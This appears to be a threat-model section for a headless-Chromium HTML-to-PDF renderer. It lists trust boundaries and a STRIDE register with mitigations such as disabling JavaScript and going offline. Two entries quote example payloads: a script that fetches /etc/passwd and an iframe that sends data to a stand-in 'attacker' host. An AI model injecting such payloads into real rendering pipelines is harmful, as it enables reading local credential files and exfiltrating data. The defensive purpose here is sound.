<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| HTML file → Chromium render | Locally-rendered HTML containing scanner-derived content reaches a headless browser process |
| Chromium → PDF output | Generated PDF carries Title/Author metadata that propagates to consultant deliverables |

## STRIDE Threat Register

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-78-14 | Information Disclosure | `<script>fetch('file:///etc/passwd')</script>` in rendered HTML executes during PDF render | mitigate | `java_script_enabled=False` on the browser context — JS never executes |
| T-78-15 | Information Disclosure | `<iframe src="http://attacker/log?...">` exfiltrates via network during render | mitigate | `offline=True` on the context — network requests blocked |
| T-78-16 | Tampering | CSP bypass enables unintended resource loads | mitigate | `bypass_csp=False` (explicit even though default) |
| T-78-17 | Spoofing | PDF Title/Author derived from scanner/operator content | mitigate | HTML `<title>` and `<meta name="author">` are constants (Plan 02); page.pdf() accepts no title/author kwargs (per D-78-R2) |
| T-78-18 | Tampering | header_template/footer_template injection vector | mitigate | `display_header_footer=False` explicit on page.pdf() |
</threat_model>
